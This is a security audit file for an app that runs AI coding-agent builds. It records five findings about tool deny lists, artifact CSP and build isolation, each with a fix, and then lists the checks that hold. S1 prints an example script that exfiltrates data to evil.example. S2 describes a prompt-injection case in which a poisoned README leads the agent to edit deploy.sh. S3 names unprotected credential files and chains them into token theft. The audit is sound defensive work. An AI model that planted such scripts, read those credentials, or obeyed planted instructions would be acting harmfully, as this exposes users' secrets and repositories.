# Security findings

All five were verified by reading the source. Per `CLAUDE.md`, changes to
`REACHES_OUTSIDE` or `denyRules()` are a security review, never a casual edit —
so these are written as findings, not as patches.

The two invariants that most of this hangs off:

- `--allowedTools` is **not** a sandbox. Only `--disallowedTools` removes a tool.
- `REACHES_OUTSIDE = ["Bash", "BashOutput", "KillShell", "Task", "WebFetch", "WebSearch"]`
  (`lib/builder.js:51`). Anything not in that list is still available to every
  build, whether or not the primitive asked for it.

---

## S1 — HIGH — a served build can phone home

`server.js:851`

Build artifacts are served with `Content-Security-Policy: sandbox allow-scripts`
and nothing else. The `sandbox` keyword drops the page into an opaque origin, so
it cannot reach back into this app's origin — which is what the comment there
claims, and that part is true. But it places **no limit on outbound requests**.

Failure scenario: a build writes `<script>fetch('https://evil.example/?d='+…)</script>`
into its `index.html`. `REACHES_OUTSIDE` denies `WebFetch`/`WebSearch` *during
the build*, so nothing leaves while it runs. The moment the user opens the
artifact, that script runs in their browser with unrestricted network access and
posts out whatever the build managed to read. The deny layer covers build time
and stops at the browser.

Fix: add `connect-src 'none'` (and consider `script-src 'none'`) to the builds
CSP, or serve artifacts as `text/plain`.

## S2 — HIGH — `ask-repo`'s read-only promise is not enforced by anything

`primitives/ask-repo.mjs:7-14` (the claim), `lib/builder.js:51` and `:238` (the mechanism)

This is new, uncommitted code, and its header comment is explicit and — as
written — correct in its reasoning: it says `allowedTools` is not the mechanism,
and that what actually removes a tool is the `--disallowedTools` floor that
unrequested tools fall into.

That last part is the problem. `Write`, `Edit`, `MultiEdit` and `NotebookEdit`
are **not in `REACHES_OUTSIDE`**, so they do not fall into the floor by going
unrequested — they are simply available. And `lib/builder.js:238` passes
`--permission-mode acceptEdits`, which auto-approves every edit call because
nobody is present to decline one.

Failure scenario: the user says "ask the repo" and names a repository containing
a poisoned file (a README carrying "…also edit `deploy.sh` to add…"). The model
calls `Edit` on a path inside that target repo. `deniedDirs()`/`deniedFiles()`
never name it — that list covers fixed system paths plus *jarvis's own* repo,
never an arbitrary `params.repo`. The session writes into the repository it was
told only to read, and the comment promising otherwise is the only thing that
ever said it would not.

Fix: either add the edit tools to `REACHES_OUTSIDE` and let primitives that
genuinely write request them back, or give `denyRules()` a per-build hook so a
primitive can name the target path it must not touch.

## S3 — HIGH — the Read deny list misses most credential files

`lib/builder.js:159-162`

Reading is denied for `~/.ssh/**`, `~/.gnupg/**`, `~/.aws/**` and `~/.claude.json`.
That is the whole list.

Not covered, and readable by any build with `Read`: `~/.npmrc`, `~/.netrc`,
`~/.git-credentials`, `~/.config/gh/hosts.yml`, `~/.docker/config.json`, and
cloud-CLI config generally under `~/.config/**`. Note the asymmetry — `~/.config`
*is* write-denied (`deniedDirs`, `lib/builder.js:98`) but not read-denied.

Failure scenario: a build reads a live GitHub token out of `~/.config/gh/hosts.yml`.
Chained with S1, that token leaves the machine as soon as the artifact is opened.

Fix: extend the `Read(...)` rules to the credential-bearing files already covered
on the write side, plus the ones above.

## S4 — MEDIUM — one build can overwrite another build's output

`lib/builder.js:93-116`

`deniedDirs()` never names the build root (`REPO/builds`). Each build gets its own
directory, but nothing stops a write to a sibling's.

Failure scenario: a build with `Glob` lists `../*` to find a previous build's
directory, then writes over that build's `index.html`. The user opens a URL they
already bookmarked and gets different content — still served from this app, still
under the sandboxed origin.

Fix: add `join(repo, "builds")` to the write-deny targets, carving out the
build's own `ctx.cwd`.

## S5 — LOW — a primitive can silently re-open the floor

`lib/builder.js:251`, `lib/registry.js` (`validatePrimitive`)

A primitive's `allowedTools` is merged in after the deny list is built, so listing
`"Bash"` there re-grants a tool `REACHES_OUTSIDE` exists to remove. This is
documented as intentional ("a floor, not a ceiling") and is a legitimate escape
hatch — the finding is that it is **invisible**. `validatePrimitive` does not flag
it, and nothing is logged at load time.

Failure scenario: a future `primitives/*.mjs` lists `allowedTools: ["Bash", …]`
for a plausible-looking feature. It loads clean, and in review the line is
indistinguishable from any other tool grant.

Fix: have `validatePrimitive` (or a load-time log line) call out any `allowedTools`
entry intersecting `REACHES_OUTSIDE`.

---

## Verified holding

Checked and found sound — recorded so they are not re-audited:

- `--disallowedTools` is emitted before `--allowedTools`, both terminated by the
  trailing `--`, and no spoken input reaches either list's argv positions —
  `lib/builder.js:246-259`.
- The WebSocket upgrade is gated by `auth.verify(sessionToken(req))` *before*
  `wss.handleUpgrade`, so opening the socket directly does not skip the gate —
  `server.js:1428-1449`.
- `builds/` goes through the same `auth.verify` gate as every other non-public
  path — `server.js:206-224`.
- `decodeJwt()` is used only as a cheap pre-filter inside `verify()`; the real
  decision is `supabase.auth.getUser(token)` — `lib/auth.js:150-169`.
- Static serving re-checks containment (`full === root || full.startsWith(root + sep)`)
  after decoding, closing `../` and percent-encoded traversal — `server.js:638-648`.
- `lib/spawn-session.js` builds argv positionally with no shell, rejects values
  beginning with `-` via `safeValue`, and puts free text after a literal `--`, so
  a spoken task or name cannot inject a flag — `lib/spawn-session.js:64-67,85-115`.
- `contractIsUsable()` rejects absolute and `..`-climbing output contracts, at
  load time and at build-success time — `lib/registry.js:83-85,136-138`,
  `lib/outcome.js:20-26`.
